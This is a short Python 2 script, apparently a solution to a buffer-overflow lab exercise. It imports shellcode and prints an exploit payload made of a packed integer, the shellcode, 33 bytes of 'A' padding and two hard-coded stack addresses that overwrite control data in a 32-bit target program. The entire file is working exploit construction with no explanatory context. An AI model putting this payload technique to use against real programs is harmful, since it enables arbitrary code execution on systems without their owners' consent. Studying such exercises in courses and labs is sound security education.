from shellcode import shellcode 
from struct import pack 
import sys

print pack("<I", 0x40000000) + shellcode +"A"*33 +pack("<I",0xbffe8a70) + pack("<I",0xbffe8a80 )
